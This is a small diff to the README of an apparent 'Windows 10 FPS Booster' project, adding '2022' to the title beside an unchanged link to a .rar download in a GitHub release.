@@ -1,4 +1,4 @@
-## <p align="middle"> Windows 10 FPS Booster 
+## <p align="middle"> Windows 10 FPS Booster 2022
 
 ### <p align="middle"> DOWNLOAD : [Click Here](https://github.com/Speedyreal/Windows10BoosterFPS/releases/download/Windows10/Windows10BoosterFPS.rar)
   
@@ -67,4 +67,3 @@
  ***
    
    
-
